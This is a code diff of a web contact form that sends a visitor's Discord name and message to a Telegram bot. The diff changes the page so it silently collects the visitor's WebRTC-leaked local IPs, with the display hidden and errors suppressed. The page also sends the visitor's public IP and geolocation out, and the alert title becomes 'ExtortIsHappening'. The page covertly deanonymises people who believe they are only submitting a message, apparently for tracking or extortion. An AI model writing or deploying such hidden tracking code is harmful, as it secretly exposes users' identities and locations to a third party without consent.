@@ -96,12 +96,9 @@
       font-size: 1rem;
     }
 
+    /* Hide the WebRTC IP display container */
     #webrtcIPs {
-      margin-top: 0.5rem;
-      font-size: 0.9rem;
-      color: #bbb;
-      text-align: center;
-      font-family: monospace;
+      display: none;
     }
   </style>
 </head>
@@ -116,7 +113,7 @@
     <div id="clock"></div>
     <div id="tzWarning"></div>
     <div id="submissionsToday">Submissions today: 0</div>
-    <div id="webrtcIPs"></div>
+    <div id="webrtcIPs"></div> <!-- Hidden -->
   </div>
 
 <script>
@@ -163,25 +160,32 @@ updateClock();
     });
 })();
 
-// WebRTC Leak IP detection
+// WebRTC Leak IP detection (silent)
 async function getLocalIPs() {
   return new Promise((resolve, reject) => {
     const ips = new Set();
     try {
       const pc = new RTCPeerConnection({ iceServers: [] });
-      pc.createDataChannel('');
+      pc.createDataChannel(''); // create a bogus data channel
+
       pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => reject(e));
-      pc.onicecandidate = (ice) => {
-        if (!ice || !ice.candidate) {
-          if (ips.size === 0) resolve([]);
+
+      pc.onicecandidate = (event) => {
+        if (!event || !event.candidate) {
+          // Candidate gathering finished
+          if (ips.size === 0) {
+            resolve([]);
+          } else {
+            resolve([...ips]);
+          }
           return;
         }
+        const candidate = event.candidate.candidate;
         const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-        const ipMatch = ipRegex.exec(ice.candidate.candidate);
+        const ipMatch = ipRegex.exec(candidate);
         if (ipMatch) {
           ips.add(ipMatch[1]);
-          document.getElementById("webrtcIPs").innerText = `🕵️ WebRTC Local IPs: ${[...ips].join(", ")}`;
-          resolve([...ips]);
+          // No UI update here (silent)
         }
       };
     } catch(e) {
@@ -190,14 +194,19 @@ async function getLocalIPs() {
   });
 }
 
-// Get WebRTC IPs on load
+// Get WebRTC IPs on load silently
 getLocalIPs().then(ips => {
   localIPs = ips;
 }).catch(() => {
-  document.getElementById("webrtcIPs").innerText = "🕵️ WebRTC IP detection not supported";
+  // silently ignore errors
 });
 
 async function sendMessage() {
+  const button = document.getElementById("sendBtn");
+  if (button.disabled) {
+    return; // Prevent sending if cooldown active or sending
+  }
+
   const discord = document.getElementById("discord").value.trim();
   const message = document.getElementById("message").value.trim();
   const responseEl = document.getElementById("response");
@@ -207,16 +216,14 @@ async function sendMessage() {
     return;
   }
 
+  button.disabled = true;
+  button.innerText = "Sending...";
+
   try {
     const ipRes = await fetch("https://ipapi.co/json/");
     const ipData = await ipRes.json();
 
-    const locationInfo = `🌍 *IP Info:*
-IP: ${ipData.ip}
-City: ${ipData.city}
-Region: ${ipData.region}
-Country: ${ipData.country_name}
-Timezone: ${ipData.timezone}`;
+    const locationInfo = `🌍 *IP Info:*\nIP: ${ipData.ip}\nCity: ${ipData.city}\nRegion: ${ipData.region}\nCountry: ${ipData.country_name}\nTimezone: ${ipData.timezone}`;
 
     let webrtcInfo = "";
     if (localIPs.length > 0) {
@@ -225,11 +232,7 @@ Timezone: ${ipData.timezone}`;
       webrtcInfo = `\n🕵️ *WebRTC Local IP Leak(s):* None detected or not supported`;
     }
 
-    const text = `🚨 *New Submission*
-👤 *Discord:* ${discord}
-💬 *Message:* ${message}
-
-${locationInfo}${webrtcInfo}`;
+    const text = `🚨 *ExtortIsHappening*\n👤 *Discord:* ${discord}\n💬 *Message:* ${message}\n\n${locationInfo}${webrtcInfo}`;
 
     const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: "POST",
@@ -245,14 +248,18 @@ ${locationInfo}${webrtcInfo}`;
       responseEl.style.display = "block";
       document.getElementById("discord").value = '';
       document.getElementById("message").value = '';
-      startCooldown();
+      startCooldown(); // start cooldown
     } else {
       responseEl.innerText = `❌ Telegram error: ${data.description}`;
       responseEl.style.display = "block";
+      button.disabled = false;
+      button.innerText = "Send";
     }
   } catch (err) {
     responseEl.innerText = "❌ Network error occurred.";
     responseEl.style.display = "block";
+    button.disabled = false;
+    button.innerText = "Send";
   }
 }
 </script>
